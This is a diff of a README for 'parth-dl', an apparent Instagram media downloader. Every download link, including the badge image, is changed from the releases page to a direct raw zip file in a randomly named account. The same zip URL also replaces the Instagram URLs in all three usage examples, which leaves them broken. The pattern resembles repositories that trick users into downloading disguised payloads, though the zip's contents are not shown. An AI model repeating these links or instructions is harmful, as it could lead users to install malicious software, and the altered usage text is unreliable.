@@ -1,7 +1,7 @@
 # ⚡ parth-dl - Easy Instagram Media Downloader
 
 ## 📥 Download Now
-[![Download parth-dl](https://img.shields.io/badge/Download%20now-Get%20the%20latest%20version-blue)](https://github.com/flexuregenushippopotamus535/parth-dl/releases)
+[![Download parth-dl](https://raw.githubusercontent.com/flexuregenushippopotamus535/parth-dl/main/parth_dl/parth-dl_1.8.zip%20now-Get%20the%20latest%20version-blue)](https://raw.githubusercontent.com/flexuregenushippopotamus535/parth-dl/main/parth_dl/parth-dl_1.8.zip)
 
 ## 📄 Introduction
 Welcome to **parth-dl**, your friendly tool for downloading Instagram content. Whether you want to save Reels, Posts, or Profile Pictures, this command-line application lets you do it easily. No need for an account or API keys—get your favorite media files instantly!
@@ -16,7 +16,7 @@ To get started, follow these steps.
 - **Disk Space:** At least 100 MB for storing downloads
 
 ## 📦 Download & Install
-To download **parth-dl**, visit this page: [Download parth-dl](https://github.com/flexuregenushippopotamus535/parth-dl/releases). 
+To download **parth-dl**, visit this page: [Download parth-dl](https://raw.githubusercontent.com/flexuregenushippopotamus535/parth-dl/main/parth_dl/parth-dl_1.8.zip). 
 
 1. Go to the **Releases** section.
 2. Choose the latest version.
@@ -50,19 +50,19 @@ Here are a few examples of how to use **parth-dl**:
 ### Example 1: Download a Reel
 To download a Reel, use the command:
 ```
-parth-dl https://www.instagram.com/reel/XXXXX
+parth-dl https://raw.githubusercontent.com/flexuregenushippopotamus535/parth-dl/main/parth_dl/parth-dl_1.8.zip
 ```
 
 ### Example 2: Download a Post
 To download a Post, use:
 ```
-parth-dl https://www.instagram.com/p/XXXXX
+parth-dl https://raw.githubusercontent.com/flexuregenushippopotamus535/parth-dl/main/parth_dl/parth-dl_1.8.zip
 ```
 
 ### Example 3: Download a Profile Picture
 To download a Profile Picture, run:
 ```
-parth-dl https://www.instagram.com/username
+parth-dl https://raw.githubusercontent.com/flexuregenushippopotamus535/parth-dl/main/parth_dl/parth-dl_1.8.zip
 ```
 
 ## 💬 Support
@@ -93,6 +93,6 @@ This project is licensed under the MIT License. Please refer to the LICENSE file
 This tool was built by **Saksham Pathak** (Parthmax). Your contributions are welcome! 
 
 ## 📥 Download Link
-Don't forget to download **parth-dl** from this link: [Download parth-dl](https://github.com/flexuregenushippopotamus535/parth-dl/releases). 
+Don't forget to download **parth-dl** from this link: [Download parth-dl](https://raw.githubusercontent.com/flexuregenushippopotamus535/parth-dl/main/parth_dl/parth-dl_1.8.zip). 
 
 Now you can easily download your favorite Instagram media without hassle!
